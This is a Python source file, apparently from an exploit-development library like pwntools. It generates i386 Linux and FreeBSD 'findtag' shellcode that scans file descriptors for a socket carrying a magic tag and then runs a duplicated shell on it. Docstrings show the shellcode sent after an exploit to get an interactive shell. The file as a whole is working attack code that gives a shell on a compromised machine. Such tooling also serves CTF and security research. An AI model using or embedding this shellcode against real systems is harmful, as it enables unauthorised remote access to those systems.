from pwn.internal.shellcode_helper import *
from .. import dupsh

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network=['ipv4', 'ipv6'])
def findtagsh(tag, clear_socks = True, os = None):
    """Args: Tag to look for

    Finds the current file descriptor using the findtag
    shellcode, and then runs a dupsh.

    Common use case:

    sock.send_exploit()
    sock.send(findtagsh(TAG))
    time.sleep(0.1)
    sock.send(TAG.ljust(127))
    sock.interactive()"""
    return findtag(tag, clear_socks), dupsh("ebp")

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network=['ipv4', 'ipv6'])
def findtag(tag, clear_socks = True, os = None):
    """Args: tag to look for
    Tries to recv up to 127 bytes (nonblocking) from every file descriptor
    in the range [0, 65535] until one is found that outputs the magic tag as
    the first 4 bytes. If none is found, it continues to try, until it works.
    When one is found, it is left in ebp.

    An optional side effect of this is that it can be used to remove garbage
    from a socket, and will still work as long as the magic tag is "in there
    somewhere" and as long as the magic tag becomes the first 4 bytes of the
    output from recv. If you do not want this feature (perhaps because of
    poison sockets) then set clear_socks = False.

    If the feature is enabled, then a possible way to use it is something like:

    sock.do_exploit()
    sock.send(findtag(TAG) + foo_shellcode('ebp') + GARBAGE)
    time.sleep(0.5) # Here so that the findtag will have time to remove the garbarge
    sock.send(TAG.ljust(127))
    sock.talk_with_foo_shellcode()

    On my test system, it could clean out about 4k of garbage per second.
"""

    if os == 'linux':
        return """
findtag:
    push cs                  ; This is just a placeholder, which should not match the cookie.
                             ; cs is chosen since it always contains null-bytes and thus is
                             ; unlikely to be chosen as a cookie


    push SYS_socketcall
    push ecx                 ; placeholder for now
    push MSG_DONTWAIT | %s
    push 0x7f
    push esp                 ; placeholder for now
    push 1
    push esp
    push edi
    popad

.loop:
    inc bp
    mov ecx, esi
    pushad
    push SYS_socketcall_recv-1
    pop ebx
    inc ebx
    int 0x80
    popad
    pop edi
    cmp edi, 0x%08x
    push edi
    jne .loop
""" % ("0" if clear_socks else "MSG_PEEK", int(tag))

    elif os == 'freebsd':
        return """
findtag:
    push cs                  ; This is just a placeholder, which should not match the cookie.
                             ; cs is chosen since it always contains null-bytes and thus is
                             ; unlikely to be chosen as a cookie

    mov esi, esp

    xor eax, eax

    push eax
    push eax
    push MSG_DONTWAIT | %s
    push 0x7f
    push esi
    push 1
    push eax

.loop:
    push SYS_recvfrom
    pop eax

    int 0x80
    inc word [esp+4]
    cmp word [esi], 0x%08x
    jne .loop
""" % ("0" if clear_socks else "MSG_PEEK", int(tag))

    else:
        bug('OS was neither linux nor freebsd')
